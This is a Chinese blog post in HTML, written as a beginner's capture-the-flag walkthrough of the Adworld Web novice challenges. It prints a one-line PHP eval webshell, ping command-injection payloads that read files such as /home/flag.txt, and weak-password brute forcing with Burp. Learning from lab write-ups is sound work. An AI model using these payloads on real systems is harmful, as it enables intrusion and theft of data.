@@ -1,0 +1,857 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/moon.png">
+  <link rel="icon" href="/img/moon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="冰蓝弧影">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="写在前面 作为一个学习网安的菜鸡,大多时候都不太正经,只会去研究自己感兴趣的东西,导致接触的东西杂而多,但都没有显著的成果,是时候回归web正道了,就从最基础的攻防世界出发,记录我的web学习之路。  view_source 打开页面后发现鼠标左键选中和右键失灵,提示查看源码F12  edge源代码一栏选中页面选项,会显示相关站点信息的页面源码,包含js和html等 这里发现是通过js中 onc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界Web新手区">
+<meta property="og:url" content="https://blue-arc.github.io/2022/06/08/AdWorld/index.html">
+<meta property="og:site_name" content="冰蓝弧影">
+<meta property="og:description" content="写在前面 作为一个学习网安的菜鸡,大多时候都不太正经,只会去研究自己感兴趣的东西,导致接触的东西杂而多,但都没有显著的成果,是时候回归web正道了,就从最基础的攻防世界出发,记录我的web学习之路。  view_source 打开页面后发现鼠标左键选中和右键失灵,提示查看源码F12  edge源代码一栏选中页面选项,会显示相关站点信息的页面源码,包含js和html等 这里发现是通过js中 onc">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/06/07/her6mUTSKWqF8LX.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607004453104.png">
+<meta property="og:image" content="https://s2.loli.net/2022/06/07/Es3PqxWDGdju8Cl.png">
+<meta property="og:image" content="https://s2.loli.net/2022/06/07/IGBQbTzf58iYMsJ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/06/07/mHKSuMc8ZgrtkY9.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607004211230.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607112427174.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607112921575.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607113142926.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607231314286.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607231601449.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607232508454.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607233644435.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608000246499.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608011650618.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608103355127.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608104258600.png">
+<meta property="og:image" content="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608153642079.png">
+<meta property="article:published_time" content="2022-06-08T07:47:07.000Z">
+<meta property="article:modified_time" content="2022-06-08T07:56:11.520Z">
+<meta property="article:author" content="冰蓝弧影">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2022/06/07/her6mUTSKWqF8LX.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>攻防世界Web新手区 - 冰蓝弧影</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/fluid-extension.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blue-arc.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>BlueArc</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="攻防世界Web新手区"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-06-08 15:47" pubdate>
+          2022年6月8日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          44 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">攻防世界Web新手区</h1>
+            
+            <div class="markdown-body">
+              
+              <h1 id="写在前面"><a class="markdownIt-Anchor" href="#写在前面"></a> 写在前面</h1>
+<p>作为一个学习网安的菜鸡,大多时候都<strong>不太正经</strong>,只会去研究自己感兴趣的东西,导致接触的东西杂而多,但都没有显著的成果,是时候回归web正道了,就从最基础的攻防世界出发,记录我的web学习之路。</p>
+<h1 id="view_source"><a class="markdownIt-Anchor" href="#view_source"></a> view_source</h1>
+<p>打开页面后发现鼠标左键选中和右键失灵,提示查看源码F12</p>
+<p><img src="https://s2.loli.net/2022/06/07/her6mUTSKWqF8LX.png" srcset="/img/loading.gif" lazyload alt="image-20220607000350524" /></p>
+<p>edge源代码一栏选中页面选项,会显示相关站点信息的页面源码,包含js和html等</p>
+<p>这里发现是通过js中 <strong>oncontextmenu</strong> 和 <strong>onselectstart</strong> 的<strong>DOM事件</strong>来禁用鼠标点击右键菜单和目标选中</p>
+<p>html注释隐藏flag</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 在此处写注释 --&gt;</span><br></code></pre></td></tr></table></figure>
+<hr />
+<h1 id="get_post"><a class="markdownIt-Anchor" href="#get_post"></a> get_post</h1>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607004453104.png" srcset="/img/loading.gif" lazyload alt="image-20220607004453104" /></p>
+<p>http协议中使用GET方法提交变量, 方法为在url添加?和变量值,多个值用&amp;符号拼接</p>
+<p>可以直接在Query一栏添加相关变量</p>
+<p>(以GET方式提交变量<strong>不受GET方法的限制</strong>,可以是POST或者其他方法)</p>
+<p><img src="https://s2.loli.net/2022/06/07/Es3PqxWDGdju8Cl.png" srcset="/img/loading.gif" lazyload alt="image-20220607005745599" /></p>
+<p>再以POST方法提交变量b,在body处可以通过form-data和www-form-urlencoded方式提交</p>
+<p><img src="https://s2.loli.net/2022/06/07/IGBQbTzf58iYMsJ.png" srcset="/img/loading.gif" lazyload alt="image-20220607010134446" /></p>
+<hr />
+<h2 id="robots"><a class="markdownIt-Anchor" href="#robots"></a> robots</h2>
+<h4 id="robots协议"><a class="markdownIt-Anchor" href="#robots协议"></a> Robots协议</h4>
+<blockquote>
+<p>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots ExclusionProtocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取.</p>
+</blockquote>
+<p>根据协议，网站管理员可以在<strong>网站域名的根目录下放一个robots.txt 文本文件</strong>，里面可以指定不同的网络爬虫能访问的页面和禁止访问的页面，指定的页面由正则表达式表示。网络爬虫在采集这个网站之前，首先获取到这个文件，然后解析到其中的规则，然后根据规则来采集网站的数据。</p>
+<p>注意，这个协议的存在更多的是需要网络爬虫去遵守，而起不到反爬虫的功能(<strong>此地无银三百两</strong>)</p>
+<p>此协议可以减少搜索引擎爬虫的访问流量, User-agent行中 百度为Baiduspider Google为Googlebot(可查阅相关官网的爬虫列表)</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">User</span>-agent：指定对哪些爬虫生效<br>Disallow：指定要屏蔽的网址<br></code></pre></td></tr></table></figure>
+<p>Disallow 行列出的是要拦截的网页，以正斜线 (/) 开头，可以列出特定的网址或模式。要屏蔽整个网站，使用正斜线即可;要屏蔽某一目录以及其中的所有内容，在目录名后添加正斜线;要屏蔽某个具体的网页，就指出这个网页。</p>
+<p>本题若没有提示,也可以通过网站后台扫描出敏感页面</p>
+<p><img src="https://s2.loli.net/2022/06/07/mHKSuMc8ZgrtkY9.png" srcset="/img/loading.gif" lazyload alt="image-20220607004124129" /></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607004211230.png" srcset="/img/loading.gif" lazyload alt="image-20220607004211230" /></p>
+<p>查看f1ag_1s_h3re.php页面得到flag</p>
+<hr />
+<h1 id="backup"><a class="markdownIt-Anchor" href="#backup"></a> backup</h1>
+<p>根据提示网站的备份文件，通过dirsearch扫描网站目录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python dirsearch -u http://111.200.241.244:60228<br></code></pre></td></tr></table></figure>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607112427174.png" srcset="/img/loading.gif" lazyload alt="image-20220607112427174" /></p>
+<p>将文件后缀改为.php查看后获取flag</p>
+<hr />
+<h1 id="cookie"><a class="markdownIt-Anchor" href="#cookie"></a> cookie</h1>
+<p>根据题目提示查看cookie，可在edge的F12开发者选项中选中应用程序一栏查看存储的cookie</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607112921575.png" srcset="/img/loading.gif" lazyload alt="image-20220607112921575" /></p>
+<p>访问cookie.php后根据提示查看该页面的http响应头部获取flag</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607113142926.png" srcset="/img/loading.gif" lazyload alt="image-20220607113142926" /></p>
+<hr />
+<h1 id="disabled_button"><a class="markdownIt-Anchor" href="#disabled_button"></a> disabled_button</h1>
+<p>打开页面发现按钮不能点击，审计源码</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607231314286.png" srcset="/img/loading.gif" lazyload alt="image-20220607231314286" /></p>
+<p>这里input标签设为disabled，点击按钮执行动作，可以直接修改本地的元素为enable</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607231601449.png" srcset="/img/loading.gif" lazyload alt="image-20220607231601449" /></p>
+<p>也可以<strong>分析点击按钮的行为</strong>，这里点击flag按钮后会向该页面<strong>以POST提交auth=flag的表单数据</strong>，可以主动发送该请求</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607232508454.png" srcset="/img/loading.gif" lazyload alt="image-20220607232508454" /></p>
+<hr />
+<h1 id="weak_auth"><a class="markdownIt-Anchor" href="#weak_auth"></a> weak_auth</h1>
+<p>登录页面，随便输入提示用户名为admin，再次登录提示使用字典，弱口令爆破</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607233644435.png" srcset="/img/loading.gif" lazyload alt="image-20220607233644435" /></p>
+<p>用Burp中Intruder模块进行字典爆破(<strong>前提有弱口令字典</strong>)密码为<strong>123456</strong></p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608000246499.png" srcset="/img/loading.gif" lazyload alt="image-20220608000246499" /></p>
+<hr />
+<h1 id="simple_php"><a class="markdownIt-Anchor" href="#simple_php"></a> simple_php</h1>
+<p>在php中 == 或者 &lt; 和 &gt; 都是弱类型比较，只会<strong>比较值不比较类型</strong></p>
+<blockquote>
+<p>一个数字和一个字符串进行比较，PHP会把<strong>字符串转换成数字</strong>再进行比较<br />
+PHP转换的规则的是：<strong>若字符串以数字开头，则取前面所有数字作为转换结果，若无则为0</strong></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-number">233333</span> == <span class="hljs-number">233333</span>);       <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-number">233333</span> == <span class="hljs-string">&quot;233333&quot;</span>);     <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-number">233333</span> == <span class="hljs-string">&quot;233333abc&quot;</span>);  <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-number">0e12345</span> == <span class="hljs-number">0e54321</span>);     <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;abcd&quot;</span> == <span class="hljs-number">0</span>);            <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;1abc&quot;</span> == <span class="hljs-number">0</span>);            <span class="hljs-comment"># 0</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>0e开头在php解释为科学计数法，统一变为0，所以相等(常在md5比较中绕过使用)</p>
+<p>is_numeric函数判断是否为<strong>数字</strong>或者**数字字符串 **(十进制和十六进制)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-number">233333</span>);       <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&quot;233333&quot;</span>);     <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-number">0x233333</span>);     <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&quot;0x233333&quot;</span>);   <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&quot;233333abc&quot;</span>);  <span class="hljs-comment"># 0</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>根据源码构造payload</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608011650618.png" srcset="/img/loading.gif" lazyload alt="image-20220608011650618" /></p>
+<p>其中*为除数字外的任意字符</p>
+<hr />
+<h1 id="xff_referer"><a class="markdownIt-Anchor" href="#xff_referer"></a> xff_referer</h1>
+<p>xff为<strong>X-Forwarder-For</strong>，为http报文请求头格式的一种，用来识别在代理服务模式下<strong>客户端的真实ip</strong></p>
+<p><strong>referer</strong>字段表示页面来源地址，在hackbar中添加如下，不知道为什么edge下的发包有问题 😓</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608103355127.png" srcset="/img/loading.gif" lazyload alt="image-20220608103355127" /></p>
+<hr />
+<h1 id="webshell"><a class="markdownIt-Anchor" href="#webshell"></a> webshell</h1>
+<p>经典一句话木马的webshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>可以用各种webshell工具连接，这里用antsword</p>
+<p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608104258600.png" srcset="/img/loading.gif" lazyload alt="image-20220608104258600" /></p>
+<p>进去发现该环境不出网，无法反弹shell，直接得flag完事</p>
+<hr />
+<h1 id="command_execution"><a class="markdownIt-Anchor" href="#command_execution"></a> command_execution</h1>
+<p>典型的命令注入，正常的ping后面注入实现RCE</p>
+<p>linux中通过命令操作符来实现</p>
+<h3 id="和号操作符"><a class="markdownIt-Anchor" href="#和号操作符"></a> &quot;&amp;&quot;和号操作符</h3>
+<p>‘<strong>&amp;</strong>’的作用是使命令在后台运行。只要在命令后面跟上一个空格和 ‘<strong>&amp;</strong>’。也可以一次性在后台<strong>同时</strong>运行多个命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping www.baidu.com &amp; apt-get update &amp;  <br></code></pre></td></tr></table></figure>
+<h3 id="分号操作符"><a class="markdownIt-Anchor" href="#分号操作符"></a> &quot;;&quot;分号操作符</h3>
+<p>使用’<strong>;</strong>'将命令分割，使得各个命令<strong>依次执行</strong>，输出结果，<strong>互不影响</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c3 127.0.0.1;<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure>
+<h3 id="与操作符"><a class="markdownIt-Anchor" href="#与操作符"></a> &quot;&amp;&amp;&quot;与操作符</h3>
+<p>如果第一个命令执行成功，<strong>与操作符 (&amp;&amp;)<strong>才会执行第二个命令，也就是说，第一个命令退出状态是</strong>0</strong>, 该操作符在检查最后一个命令的执行状态时很有用</p>
+<p>程序编译安装(先检查编译情况)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">make &amp;&amp; make install<br></code></pre></td></tr></table></figure>
+<p>网站访问(先判断主机是否在线)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c3 www.baidu.com &amp;&amp; links www.baidu.com<br></code></pre></td></tr></table></figure>
+<h3 id="或操作符"><a class="markdownIt-Anchor" href="#或操作符"></a> &quot;||&quot;或操作符</h3>
+<p><strong>或操作符</strong> (<strong>||</strong>)很像编程中的 <strong>if-else</strong> 语句, 该操作符允许你在第一个命令失败的情况下(<strong>退出状态为1</strong>)执行第二个命令。但第一个命令执行成功(退出状态为<strong>0</strong>)就不会执行第二个命令，效果为<strong>至少得有一个指令执行成功</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> update ||<span class="hljs-built_in"> ping </span>-c3 www.baidu<span class="hljs-built_in">..</span>com<br></code></pre></td></tr></table></figure>
+<h3 id="管道操作符"><a class="markdownIt-Anchor" href="#管道操作符"></a> &quot;|&quot;管道操作符</h3>
+<p>管道操作符(<strong>|</strong>)会将第一个指令的输入结果作为第二个指令的输入，最终在屏幕中展示的是<strong>最后一个指令的输出情况</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> system.log | grep hello<br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>上面的指令可以让我们过滤出<code>system.log</code>这个文件中包含<code>hello</code>字符串的行，然后打印到屏幕上。</p>
+</blockquote>
+<p>本题可以通过管道操作符**(|)<strong>或者与操作符</strong>(&amp;&amp;)<strong>和分号操作符</strong>(😉**实现命令注入</p>
+<p>首先找到flag的位置为 <strong>/home/flag.txt</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1;find / -name <span class="hljs-string">&quot;flag&quot;</span><br>127.0.0.1 | find / -name <span class="hljs-string">&quot;flag.txt&quot;</span><br>127.0.0.1 &amp;&amp; find / -name <span class="hljs-string">&quot;flag.txt&quot;</span><br></code></pre></td></tr></table></figure>
+<p>获取flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1 | <span class="hljs-built_in">cat</span> /home/flag.txt<br></code></pre></td></tr></table></figure>
+<hr />
+<h1 id="simple_js"><a class="markdownIt-Anchor" href="#simple_js"></a> simple_js</h1>
+<p>审阅js代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">dechiffre</span>(<span class="hljs-params">pass_enc</span>)&#123;<br>        <span class="hljs-keyword">var</span> pass = <span class="hljs-string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;<br>        <span class="hljs-keyword">var</span> tab  = pass_enc.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br>        <span class="hljs-keyword">var</span> tab2 = pass.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br>    	<span class="hljs-keyword">var</span> i,j,k,l=<span class="hljs-number">0</span>,m,n,o,p = <span class="hljs-string">&quot;&quot;</span>;<br>    	i = <span class="hljs-number">0</span>;<br>    	j = tab.<span class="hljs-property">length</span>;<br>        k = j + (l) + (n=<span class="hljs-number">0</span>);<br>        n = tab2.<span class="hljs-property">length</span>;<br>        <span class="hljs-keyword">for</span>(i = (o=<span class="hljs-number">0</span>); i &lt; (k = j = n); i++ )&#123;<br>            o = tab[i-l];<br>            p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((o = tab2[i]));<br>            <span class="hljs-keyword">if</span>(i == <span class="hljs-number">5</span>) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(i = (o=<span class="hljs-number">0</span>); i &lt; (k = j = n); i++ )&#123;<br>           o = tab[i-l];<br>           <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">5</span> &amp;&amp; i &lt; k-<span class="hljs-number">1</span>) p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((o = tab2[i]));<br>        &#125;<br>        p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(tab2[<span class="hljs-number">17</span>]);<br>        pass = p;<br>    	<span class="hljs-keyword">return</span> pass;<br>    &#125;<br>    <span class="hljs-title class_">String</span>[<span class="hljs-string">&quot;fromCharCode&quot;</span>](<span class="hljs-title function_">dechiffre</span>(<span class="hljs-string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));<br><br>    h = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">prompt</span>(<span class="hljs-string">&#x27;Enter password&#x27;</span>);<br>    <span class="hljs-title function_">alert</span>( <span class="hljs-title function_">dechiffre</span>(h) );<br></code></pre></td></tr></table></figure>
+<p>乍眼一看很复杂，给了很多混淆，要弄清楚代码的意图；从输入什么返回值不变这一角度触发，故进行无用代码的处理简化</p>
